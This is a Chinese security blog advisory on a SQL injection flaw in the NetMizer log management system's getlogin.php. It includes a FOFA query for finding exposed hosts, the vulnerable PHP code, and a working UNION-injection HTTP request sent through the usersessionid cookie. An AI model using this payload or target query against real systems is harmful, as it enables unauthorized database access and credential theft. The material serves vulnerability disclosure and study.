---
title: "NetMizer日志管理系统 getlogin.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html
asset_dir: assets/netmizer日志管理系统-getlogin.php-sql注入漏洞
---

# NetMizer日志管理系统 getlogin.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/12 08:25
* 947浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

MySQL

软件

身份验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/login/getlogin.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

深入探索

SQL注入检测工具

文件大小转换

编码转换工具

# 漏洞分析

看下 `/data/login/getlogin.php` 业务实现关键逻辑部分

```
<?php

    include('../include/JSON.php');
    $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
    mysql_select_db("sysmonitor");

    $usersessionid= $_COOKIE["usersessionid"];
    $sqlstr = "SELECT DISTINCT user_name,login_ip from tbl_admin_session where session_id='$usersessionid' ";
    $res=mysql_query($sqlstr);
    while($row = mysql_fetch_array($res,MYSQL_BOTH)){
       $user_name = $row["user_name"];
       $login_ip = long2ip($row["login_ip"]);
    }
    $str = array("success"=>'success', "usersessionid"=>$user_name, "userip"=>$login_ip);

    $json = json_encode($str);
    mysql_close($conn_id);
    echo $json;

?>
```

深入探索

网络安全培训

安全运维咨询

在线安全工具

Cookie 里的 `usersessionid` 被直接拼接进SQL语句中，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

代码安全审计

```
GET /data/login/getlogin.php HTTP/1.1
Host: netmizer.mrxn.net
Cookie: usersessionid=' UNION ALL SELECT CONCAT(0x7e,user(),0x7e),NULL-- -
```

通过union注入，成功得到数据库用户信息

[![NetMizer日志管理系统 getlogin.php SQL注入漏洞](images/img-001-9a9f4280b249.webp)](https://image.mrxn.net/8da5227ecc604ff5b1777ad531dd1e78.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 getlogin.php SQL注入漏洞](https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html)  
文章链接：<https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALUklEQVR4Aeyc7XbbRgxEdfv+79wGnlyKgLgSHae2ftCn2+F8AFwvyNixe/rP7Xb790/Wv4sPe0176pPPvPxVTr/QGrG0/VKfaEZ9xad+Nm/dGayB/Mpd/7zLCWwD+TXt25m12jhwA7YeEA5Be0Pnn+1nHnqf6g/RIGhWhOjQcforPnVIH/WJtacza1+3DWQvXtc/dwIPA4FMHTqutgjJ+SSscmd1eN4P4p/p557EVzXmRPOvuLkVQvYMHY/yDwM5Cl3a953AXx8I5ClYfQo+bXCce+Xbd+bg/vVLzyz0e+lPhJ5b1auL9pF/Bf/6QL6ymav2dvvyQHw6gPZdlrq4OmxIHXS0DqLPenjUIRp0tHb2hOSmLxetk4srXf9P8MsD+ZObXjXrE3gYiFOfuG4Rxzxw49eKevt4ayBPItzR/Aoh2enffn9Mfc9/R7a/E8mh95y6fCL0OgifuRXf721/fZR/GMhR6NK+7wS2gUCmDs9xbg2Sn/rkPhlTh14P4eYhfNbJIT6gtMTZUz4LgI83e+Wv8isd0g+OcV+3DWQvXtc/dwL/+BR8Ft2yda845OkwB52r2w+6D53PfNWpidBr4ByvXrWg5+0rQvzK1lKv6z9d1xviKb4JLgcCmT4E3S+EQ/Csbm715OhD76s+EZKDR5zZV/ecPqSn+uwnf+WbEyF9Iai+x+VA9qHr+vtOYBsIHE9tPgWTQ+qm/upTgNRBx1d1+t5vj9OTT4TcUx3CITj1VxxSBx1nnXtVP8JtIEfmpX3/CXx6IJCnYG4VjvX5VMBxbvY74B/S7Pch/v6XHjy/h7nfZdvf6KeuL+pP1Bf14fk+zENywNd/uHi7Pv7qCWxviFO1++SQKaqLMz91SJ050Zw49RVXh/SFO+qJ9oZ7Bu7X+uYn6otwr4X79ayDeNbpQ3T5EW4DOTIv7ftPYBsIZHoQdCsQ7rQhHILmROi6dfoiJAfBVc78K79y0HtB55U5WpCc3rwXPPfNT7TfRHPq8sJtIJoX/uwJ/AOZfk1nv6Dr0LnbtkY+EVKn/ipvToReD53bb4+QjBp0ru49REhuxa2D5OQzD/HVRfNw7FfuekPqFN5obT/thUwNgnOaK+7nAsd1+hPtN3XofVY5dUge2FrpbcK4AD5+3wFB7VWdOvQ8dG5OtK8IPQ/hcMfrDfG03gRffg2Z+3T6kKnqr3T9idDr9WcfSA6C5kTzhWqfwl/hqq0Fx/f4FWn/VHa/NOG43qw5UX2P1xvi6bwJvvwa4vQg04eg+4dwCJoXzYmQnHzmIP7U5SIkB3e0J0STT7SHCD0P4dOXz36TQ+qh46yH+Pv66w3Zn8YbXG8DOTO92q+5ieU9W+ZnBvKUQHD6q7qZe8ZXPeBz94TkIeg9oXP1Fa72U/ltIEWu9fMnsA0EMmWnJ84tQnJTl0N8CE7dvqK+XITUQ9AcdG6+0Exd14Ke1RcrU0suQq+rTC39s1g1+wXpC0E9CAeu34fc3uxje0PcF9ynBfdrfacqh2SmPvnMy2cO0m/lTx2SB7Q+je5BXDXQF83JRfUVzpy88GEgqyaX/j0nsA2kpnO03IYecPhzoJmTn0VI35mHrruPmSsOyUJwZiE6BKumFoRDsLRaEA7B0mpBOARLG+uQrvazD28D2YvX9c+dwHIgkOnPqcrFuXVIHQRnbnLouenbH5KDoLr5QjURkoVgZfYLum6daFa+QkgfCM4cRIeOR/2XA5lNL/49J7ANBDK9eVuIDsc483KnD6lTF6Hr0Ln1onUiJA931BOtFSHZ6UPX9UXrJ5+6vgi9r3lx5oDr7yG3N/vYfh/ivqBPVd2pTtQX9Sc/q1sH2QcEX9XrF656rPSqqaUvQu4tFyE6BNWrx9HSh+Sh475m+yPLogt/9gS234e4DaclnwiZ7isdeg7CoaN95n0nNzcR7v2mZ48Vmof0kIvWQXwIqovmRUhOLpoX1fd4vSH703iD62sgbzCE/RaWA6nXqtY+XNel1arr/Sqtllpd14L++pZWyxzEh+DU5SusXq6ZgfSEjuZWdVOfHI77veoLqXuWWw7Eogu/9wSWA4E+TQiHjm4XostXCMn51Imr/MqH9IFHtJe1E6HX6FsnQnLyVwjJQ0frvA90H+58ORCbXPi9J7ANZE5P7nbkorqoDpm2+gqh52a93Ho4zpsrNCtCaqCjftXUkouQvFysbC25WFqtFVeH3rdq5toGYtGFP3sCDwNxYpBpyt0mdF0fopt7hdaZg9SvdHMiJC8vtFYs7cyC9Jp1cogPwdkTjnXrJ876PX8YyN68rr//BLYfLkKfslN1SxB/6vqiPiSvPhG6P+ug+9abEyE5wMj2K2YzogE58JGd3NxEc6L+5OqQ/iuuvsfrDdmfxhtcPwwEMlUIukefAogOwenLRevkt1uupg7pN/XJITkI6hem8/3fkIxKZWrJV1iZWvp1XQue96tMLUiurmtB56XVsj/EB65fUN3e7GN7Q2piRwsyPfc9M9B96HzWyT+L3vezdZWH7Ak6llcLoq/uAfEru18QHTrOPnJIbt+jrvULt4GUca2fP4FtINCnB8ccul5TreWnUtf7BclD0ByEQ9AaCDf3GYTU2mtVqy+uctD7rfJTh9TZFzpXFyE+cH0Nub3Zx/aGzH05dVFfDvepwvravPWiujh1+SuE+71n9mxvc3DvBff/ub994diH6PaZebkIycutK1wOxPCF33sC20BqOrUg04Og2ymvFhzr5e2XddDz6hPhXM57zPriepBeEFSvTC2IDsHSziz7iHCu3vxESD3ccRvImQ1dmf//BLb/DAgyJaforSG6/JUPPT/rrIfkIGhuIsSHjvYRCyGZ2WPyyu4XpE7NPESXi9B16yC6XJx1kJy6ucLrDfFU3gQfBgLH03O/cOxD9Jry0YL49ploDSQnX+WmfsRXPY6yzzTInp5lynt1P/2JVet6GIjGhT9zAtvvQ55NrbYGeUrMlbZfU4fkIagPnavve+2vpw+ph0ecWftAz059cvuI+mcRcj/zEA7BqcsLrzekTuGN1sN3We5t9XRAn7L5ibMeUrfSZ/3ks06+R8g9VrVmITn5zMshuRVXF6Hn1ed9oOcgHLh+lnV7s4+HP7LgPi1g265Tngh8/F4aghZA59bpi+rQ8xAOHc1bD3dfTYR4ctEeEF8uwrGubx8RjvMQHYLmn+HDQJ6FL+//P4Htu6x5q1dPw6v8Z+tnP7l9RMjTBkFzRzhrzECvhc7vddGho30mwrncrPN+hdcbMk/nh/n2XVZNZ79W+zKz8tUhT8vMTw7ncvYV7XOEZiZC7jV1e6hDz+lPNC9OX65/Bq835MwpfWNm+xoCeSrgHM49QuqmLof40HH68rMI935na8z5BEN6qIv6chGSf+WbX6H1kH7A9feQ25t9bH9kOa1XOPdv/pVuTpx5+fQhT4/+RPOF04Pj2srWgvh1XQvCZ5/JK1tr6vLyasknlldLva5d20A0L/zZE3gYCOQpgY6rbUJyTtgcRJeLcKzPevPq0OsgHB5x1son2nulQ+9tDs7pkJx1837Q/co9DKTEa/3cCfy1gUCf9uppUJ8IvX51JNbpy4/QjGgGci/oOH3rREhebn5y9YmQegjqQzhwfZd1e7OPL78hTlmETNvPE8KnD9HN6csn6kOvg3Bglmw/hbZ2BtRF4KPGnPoKzU2E3gc6t9+sK/7lgVSTa/29E3gYiNOb+NlbQp4K+0Dnsx/En7oc4ttP1C+EZCBY2pkFPW9v6DqEQ9De5uUrNAeph+A+/zCQvXldf/8JbAOBTAue49kt+jSs8tOfHLIP61/55vZoDTzvZc3Mr7i6dSLkPvoQvvLN6RduAylyrZ8/gWsgPz+DtoP/AAAA//8lN6NNAAAABklEQVQDAPN7+JvBrXTvAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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